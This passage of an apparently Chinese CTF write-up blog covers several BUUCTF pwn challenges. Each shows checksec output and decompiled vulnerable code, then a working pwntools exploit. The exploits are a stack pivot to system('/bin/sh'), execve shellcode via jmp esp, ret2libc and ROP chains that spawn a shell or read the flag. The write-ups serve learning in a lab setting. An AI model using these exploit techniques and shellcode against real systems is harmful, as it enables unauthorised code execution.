class="built_in">printf</span>(<span class="string">&quot;Hello, %s\n&quot;</span>, &amp;s);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<blockquote>
<p>两次很短的栈溢出，第一次<code>ebp leak</code>，第二次<code>leave ret</code></p>
</blockquote>
<h3 id="3gdb-6"><a class="markdownIt-Anchor" href="#3gdb-6"></a> 3.GDB</h3>
<ul>
<li>**1.**输入0x20+4个字符串，泄露ebp</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ECX: 0xffffcff0 (&#x27;a&#x27; &lt;repeats 36 times&gt;, &quot;\n\320\377\377(\320\377\377*\206\004\b\334c\373\367@\320\377\377&quot;)</span><br><span class="line">................</span><br><span class="line">EBP: 0xffffd018 --&gt; 0xffffd028 --&gt; 0x0 </span><br></pre></td></tr></table></figure>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">hex</span>(<span class="number">0xffffcff0</span>- <span class="number">0xffffd018</span>)</span><br><span class="line"><span class="string">&#x27;-0x28&#x27;</span></span><br></pre></td></tr></table></figure>
<blockquote>
<p>下一步时，程序会抬栈，所以这时候的buf为<code>0xffffd028</code>，偏移量为<code>0x28-0x10</code></p>
</blockquote>
<ul>
<li><strong>2.构造payload</strong></li>
</ul>
<p>主要目标是：让程序<code>ret</code>到栈开始的地方，将刚才构造的<code>payload</code>当作命令执行</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pl2=(<span class="string">&#x27;aaaa&#x27;</span>+p32(sys_plt)+<span class="string">&#x27;bbbb&#x27;</span>+p32(buf+<span class="number">0x10</span>)+<span class="string">&#x27;/bin/sh\x00&#x27;</span>).ljust(<span class="number">0x28</span>,<span class="string">&#x27;a&#x27;</span>)+p32(buf)+p32(leave)</span><br></pre></td></tr></table></figure>
<h3 id="4exp-10"><a class="markdownIt-Anchor" href="#4exp-10"></a> 4.EXP</h3>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&quot;debug&quot;</span></span><br><span class="line"><span class="comment">#p = remote(&quot;node3.buuoj.cn&quot;,&quot;26826&quot;)</span></span><br><span class="line">p = process(<span class="string">&quot;./ciscn_s_4&quot;</span>)</span><br><span class="line">elf = ELF(<span class="string">&quot;./ciscn_s_4&quot;</span>)</span><br><span class="line"></span><br><span class="line">leave=<span class="number">0x8048562</span></span><br><span class="line">sys_plt=<span class="number">0x8048400</span></span><br><span class="line"></span><br><span class="line">pl1=<span class="string">&#x27;a&#x27;</span>*<span class="number">0x24</span>+<span class="string">&#x27;bbbb&#x27;</span></span><br><span class="line">p.send(pl1)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;bbbb&#x27;</span>)</span><br><span class="line">ebp=u32(p.recv(<span class="number">4</span>))</span><br><span class="line">success(<span class="string">&quot;EBP =&gt;0x%x&quot;</span>,ebp)</span><br><span class="line">context.terminal=[<span class="string">&quot;tmux&quot;</span>,<span class="string">&#x27;splitw&#x27;</span>,<span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line">gdb.attach(p)</span><br><span class="line"></span><br><span class="line">buf=ebp-<span class="number">0x38</span></span><br><span class="line">pl2=(<span class="string">&#x27;aaaa&#x27;</span>+p32(sys_plt)+<span class="string">&#x27;bbbb&#x27;</span>+p32(buf+<span class="number">16</span>)+<span class="string">&#x27;/bin/sh\x00&#x27;</span>).ljust(<span class="number">0x28</span>,<span class="string">&#x27;a&#x27;</span>)+p32(buf)+p32(leave)</span><br><span class="line">p.send(pl2)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<h2 id="cisncn_2019_s_6"><a class="markdownIt-Anchor" href="#cisncn_2019_s_6"></a> cisncn_2019_s_6</h2>
<p>和<a target="_blank" rel="noopener" href="http://www.joe1sn.top/2020/BUUCTF/#ciscn_2019_es_1">ciscn_2019_es_1</a>一样</p>
<h2 id="ciscn_2019_s_9"><a class="markdownIt-Anchor" href="#ciscn_2019_s_9"></a> ciscn_2019_s_9</h2>
<h3 id="1checksec-34"><a class="markdownIt-Anchor" href="#1checksec-34"></a> 1.checksec</h3>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Arch:     i386-32-little</span><br><span class="line">RELRO:    Partial RELRO</span><br><span class="line">Stack:    No canary found</span><br><span class="line">NX:       NX disabled</span><br><span class="line">PIE:      No PIE (0x8048000)</span><br><span class="line">RWX:      Has RWX segments</span><br></pre></td></tr></table></figure>
<blockquote>
<p>估计和shellcode相关</p>
</blockquote>
<h3 id="2ida-33"><a class="markdownIt-Anchor" href="#2ida-33"></a> 2.IDA</h3>
<p><strong>pwn</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">pwn</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> s[<span class="number">24</span>]; <span class="comment">// [esp+8h] [ebp-20h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;\nHey! ^_^&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;\nIt&#x27;s nice to meet you&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;\nDo you have anything to tell?&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;&gt;&quot;</span>);</span><br><span class="line">  fflush(<span class="built_in">stdout</span>);</span><br><span class="line">  fgets(s, <span class="number">50</span>, <span class="built_in">stdin</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;OK bye~&quot;</span>);</span><br><span class="line">  fflush(<span class="built_in">stdout</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<blockquote>
<p>第十行栈溢出</p>
</blockquote>
<p><strong>hint</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">; Attributes: bp-based frame</span><br><span class="line">;void hint</span><br><span class="line">public hint</span><br><span class="line">hint proc near</span><br><span class="line">; __unwind &#123;</span><br><span class="line">push    ebp</span><br><span class="line">mov     ebp, esp</span><br><span class="line">jmp     esp</span><br><span class="line">hint endp</span><br></pre></td></tr></table></figure>
<blockquote>
<p>利用<code>jmp esp</code>实现跳转</p>
</blockquote>
<h3 id="3exp-24"><a class="markdownIt-Anchor" href="#3exp-24"></a> 3.EXP</h3>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&quot;debug&quot;</span></span><br><span class="line">elf = ELF(<span class="string">&quot;./ciscn_s_9&quot;</span>)</span><br><span class="line">p = remote(<span class="string">&quot;node3.buuoj.cn&quot;</span>,<span class="string">&quot;25940&quot;</span>)</span><br><span class="line"></span><br><span class="line">shellcode =  <span class="string">&quot;\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80&quot;</span></span><br><span class="line">gadget = asm(<span class="string">&quot;sub esp,0x28 ; jmp esp&quot;</span>)</span><br><span class="line">jmp_esp = <span class="number">0x08048554</span></span><br><span class="line"></span><br><span class="line">payload = shellcode.ljust(<span class="number">0x24</span>,<span class="string">&#x27;\x00&#x27;</span>)+p32(jmp_esp)+gadget</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<h2 id="cmcc_pwnme1"><a class="markdownIt-Anchor" href="#cmcc_pwnme1"></a> cmcc_pwnme1</h2>
<h3 id="1checksec-35"><a class="markdownIt-Anchor" href="#1checksec-35"></a> 1.checksec</h3>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Arch:     i386-32-little</span><br><span class="line">RELRO:    Partial RELRO</span><br><span class="line">Stack:    No canary found</span><br><span class="line">NX:       NX disabled</span><br><span class="line">PIE:      No PIE (0x8048000)</span><br><span class="line">RWX:      Has RWX segments</span><br></pre></td></tr></table></figure>
<h3 id="2ida-34"><a class="markdownIt-Anchor" href="#2ida-34"></a> 2.IDA</h3>
<p><strong>getfruit</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">getfruit</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> v1; <span class="comment">// [esp+14h] [ebp-A4h]</span></span><br><span class="line"></span><br><span class="line">  fflush(<span class="built_in">stdout</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Please input the name of fruit:&quot;</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%s&quot;</span>, &amp;v1);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">printf</span>(<span class="string">&quot;oh,%s...\n&quot;</span>, &amp;v1);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<blockquote>
<p>栈溢出</p>
</blockquote>
<h3 id="3exp-25"><a class="markdownIt-Anchor" href="#3exp-25"></a> 3.EXP</h3>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&quot;debug&quot;</span></span><br><span class="line">elf = ELF(<span class="string">&quot;./pwnme1&quot;</span>)</span><br><span class="line">p = remote(<span class="string">&quot;node3.buuoj.cn&quot;</span>,<span class="string">&quot;28427&quot;</span>)</span><br><span class="line"></span><br><span class="line">puts_plt = elf.plt[<span class="string">&quot;puts&quot;</span>]</span><br><span class="line">puts_got = elf.got[<span class="string">&quot;puts&quot;</span>]</span><br><span class="line">getfruit = <span class="number">0x08048624</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*(<span class="number">0xA4</span>+<span class="number">4</span>)</span><br><span class="line">payload += p32(puts_plt)+p32(getfruit)+p32(puts_got)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&quot;&gt;&gt; 6. Exit    &quot;</span>,<span class="string">&#x27;5&#x27;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;Please input the name of fruit:&quot;</span>,payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">puts_real = u32(p.recvuntil(<span class="string">&#x27;\xf7&#x27;</span>)[-<span class="number">4</span>:].ljust(<span class="number">4</span>,<span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line">libc = LibcSearcher(<span class="string">&quot;puts&quot;</span>,puts_real)</span><br><span class="line">base = puts_real-libc.dump(<span class="string">&quot;puts&quot;</span>)</span><br><span class="line">sys_addr = base+libc.dump(<span class="string">&quot;system&quot;</span>)</span><br><span class="line">binsh = base+libc.dump(<span class="string">&quot;str_bin_sh&quot;</span>)</span><br><span class="line">success(<span class="string">&quot;libc base 0x%x&quot;</span>,base)</span><br><span class="line">success(<span class="string">&quot;binsh 0x%x&quot;</span>,binsh)</span><br><span class="line">success(<span class="string">&quot;system 0x%x&quot;</span>,sys_addr)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*(<span class="number">0xA4</span>+<span class="number">4</span>)</span><br><span class="line">payload += p32(sys_addr)+<span class="string">&#x27;aaaa&#x27;</span>+p32(binsh)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;Please input the name of fruit:&quot;</span>,payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<h2 id="cmcc_pwnme2"><a class="markdownIt-Anchor" href="#cmcc_pwnme2"></a> cmcc_pwnme2</h2>
<h3 id="1checksec-36"><a class="markdownIt-Anchor" href="#1checksec-36"></a> 1.checksec</h3>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Arch:     i386-32-little</span><br><span class="line">RELRO:    Partial RELRO</span><br><span class="line">Stack:    No canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      No PIE (0x8048000)</span><br></pre></td></tr></table></figure>
<h3 id="2ida-35"><a class="markdownIt-Anchor" href="#2ida-35"></a> 2.IDA</h3>
<p><strong>userfunction</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">userfunction</span><span class="params">(<span class="type">char</span> *src)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> dest; <span class="comment">// [esp+Ch] [ebp-6Ch]</span></span><br><span class="line">  <span class="built_in">strcpy</span>(&amp;dest, src);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">printf</span>(<span class="string">&quot;Hello, %s\n&quot;</span>, src);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<blockquote>
<p>之前在<code>main</code>里面输入过多的话，会导致这里栈溢出</p>
</blockquote>
<p><strong>exec_string</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">exec_string</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> s; <span class="comment">// [esp+Bh] [ebp-Dh]</span></span><br><span class="line">  FILE *stream; <span class="comment">// [esp+Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  stream = fopen(&amp;<span class="built_in">string</span>, <span class="string">&quot;r&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( !stream )</span><br><span class="line">    perror(<span class="string">&quot;Wrong file&quot;</span>);</span><br><span class="line">  fgets(&amp;s, <span class="number">50</span>, stream);</span><br><span class="line">  <span class="built_in">puts</span>(&amp;s);</span><br><span class="line">  fflush(<span class="built_in">stdout</span>);</span><br><span class="line">  <span class="keyword">return</span> fclose(stream);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<blockquote>
<p><code>string</code>变量在bss段上，要想执行它，就必须把<code>/flag</code>命令写到<code>string</code>上，这里就可以构造payload</p>
</blockquote>
<h3 id="3exp-26"><a class="markdownIt-Anchor" href="#3exp-26"></a> 3.EXP</h3>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&quot;debug&quot;</span></span><br><span class="line">sh = remote(<span class="string">&quot;node3.buuoj.cn&quot;</span>,<span class="number">28490</span>)</span><br><span class="line">elf = ELF(<span class="string">&quot;pwnme2&quot;</span>)</span><br><span class="line">pop_ebp_ret = <span class="number">0x08048680</span></span><br><span class="line">offset = <span class="number">0x6C</span>+<span class="number">4</span></span><br><span class="line">payload = offset * <span class="string">&quot;a&quot;</span></span><br><span class="line">payload += p32(elf.plt[<span class="string">&#x27;gets&#x27;</span>])</span><br><span class="line">payload += p32(pop_ebp_ret)</span><br><span class="line">payload += p32(<span class="number">0x0804A060</span>)<span class="comment">#bss_string</span></span><br><span class="line">payload += p32(<span class="number">0x080485CB</span>)<span class="comment">#exec_string</span></span><br><span class="line">sh.sendlineafter(<span class="string">&quot;Please input:&quot;</span>,payload)</span><br><span class="line">sh.sendline(<span class="string">&quot;/flag&quot;</span>)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>
<h2 id="cmcc_simplerop"><a class="markdownIt-Anchor" href="#cmcc_simplerop"></a> cmcc_simplerop</h2>
<h3 id="1checksec-37"><a class="markdownIt-Anchor" href="#1checksec-37"></a> 1.checksec</h3>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Arch:     i386-32-little</span><br><span class="line">RELRO:    Partial RELRO</span><br><span class="line">Stack:    No canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      No PIE (0x8048000)</span><br></pre></td></tr></table></figure>
<h3 id="2ida-36"><a class="markdownIt-Anchor" href="#2ida-36"></a> 2.IDA</h3>
<blockquote>
<p>发现了超级多的无用函数</p>
</blockquote>
<p><strong>main</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v4; <span class="comment">// [esp+1Ch] [ebp-14h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;ROP is easy is&#x27;nt it ?&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Your input :&quot;</span>);</span><br><span class="line">  fflush(<span class="built_in">stdout</span>);</span><br><span class="line">  <span class="keyword">return</span> read(<span class="number">0</span>, &amp;v4, <span class="number">100</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<blockquote>
<p>很明显的<code>read</code>溢出，但是不大好的构造ropchain,所以先用ROPgadget自动生成ropchain，但是需要调整长度</p>
</blockquote>
<p><code>ROPgadget --binary simplerop --ropchain</code></p>
<h3 id="3exp-27"><a class="markdownIt-Anchor" href="#3exp-27"></a> 3.EXP</h3>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> struct <span class="keyword">import</span> pack</span><br><span class="line"><span class="comment">#io=process(&#x27;./simplerop&#x27;)</span></span><br><span class="line">io=remote(<span class="string">&quot;node3.buuoj.cn&quot;</span>,<span class="number">25035</span>)</span><br><span class="line">io.recvuntil(<span class="string">&#x27;:&#x27;</span>)</span><br><span class="line"><span class="comment"># Padding goes here</span></span><br><span class="line">p = <span class="string">&#x27;a&#x27;</span>*<span class="number">0x14</span>+p32(<span class="number">1</span>)*<span class="number">3</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0806e82a</span>) <span class="comment"># pop edx ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x080ea060</span>) <span class="comment"># @ .data</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x080bae06</span>) <span class="comment"># pop eax ; ret</span></span><br><span class="line">p += <span class="string">&#x27;/bin&#x27;</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0809a15d</span>) <span class="comment"># mov dword ptr [edx], eax ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0806e82a</span>) <span class="comment"># pop edx ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x080ea064</span>) <span class="comment"># @ .data + 4</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x080bae06</span>) <span class="comment"># pop eax ; ret</span></span><br><span class="line">p += <span class="string">&#x27;//sh&#x27;</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0809a15d</span>) <span class="comment"># mov dword ptr [edx], eax ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0806e850</span>) <span class="comment"># pop edx pop ecx pop edx; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0</span>)</span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0</span>)</span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x080ea060</span>) <span class="comment">#bin/sh</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x080bae06</span>) <span class="comment">#pop eax</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0xb</span>)        <span class="comment"># eax=0xb</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x080493e1</span>) <span class="comment">#int 80</span></span><br><span class="line">io.send(p)</span><br><span class="line">io.interactive()</span><br><span class="line"><span class="built_in">print</span> <span class="built_in">hex</span>(<span class="built_in">len</span>(p))</span><br></pre></td></tr></table></figure>
<h2 id="ez_pz_hackover_2016"><a class="markdownIt-Anchor" href="#ez_pz_hackover_2016"></a> ez_pz_hackover_2016</h2>
<h3 id="1checksec-38"><a class="markdownIt-Anchor" href="#1checksec-38"></a> 1.checksec</h3>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Arch:     i386-32-little</span><br><span class="line">RELRO:    Full RELRO</span><br><span class="line">Stack:    No canary found</span><br><span class="line">NX:       NX disabled</span><br><span class="line">PIE:      No PIE (0x8048000)</span><br><span class="line">RWX:      Has RWX segments</span><br></pre></td></tr></table></figure>
<h3 id="2ida-37"><a class="markdownIt-Anchor" href="#2ida-37"></a> 2.IDA</h3>
<p><strong>main</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  setbuf(<span class="built_in">stdout</span>, <span class="number">0</span>);</span><br><span class="line">  header();</span><br><span class="line">  chall();</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><strong>chall</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">chall</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">size_t</span> v0; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">int</span> result; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">char</span> s; <span class="comment">// [esp+Ch] [ebp-40Ch]</span></span><br><span class="line">  _BYTE *v3; <span class="comment">// [esp+40Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Yippie, lets crash: %p\n&quot;</span>, &amp;s);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Whats your name?\n&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;&gt; &quot;</span>);</span><br><span class="line">  fgets(&amp;s, <span class="number">1023</span>, <span class="built_in">stdin</span>);</span><br><span class="line">  v0 = <span class="built_in">strlen</span>(&amp;s);</span><br><span class="line">  v3 = <span class="built_in">memchr</span>(&amp;s, <span class="number">10</span>, v0);</span><br><span class="line">  <span class="keyword">if</span> ( v3 )</span><br><span class="line">    *v3 = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;\nWelcome %s!\n&quot;</span>, &amp;s);</span><br><span class="line">  result = <span class="built_in">strcmp</span>(&amp;s, <span class="string">&quot;crashme&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( !result )</span><br><span class="line">    result = vuln((<span class="type">unsigned</span> <span class="type">int</span>)&amp;s, <span class="number">0x400</span>u);</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><strong>vuln</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> *__cdecl <span class="title function_">vuln</span><span class="params">(<span class="type">char</span> src, <span class="type">size_t</span> n)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> dest; <span class="comment">// [esp+6h] [ebp-32h]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">memcpy</span>(&amp;dest, &amp;src, n);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<blockquote>
<p>strlen()遇见’\x00’截断</p>
</blockquote>
<blockquote>
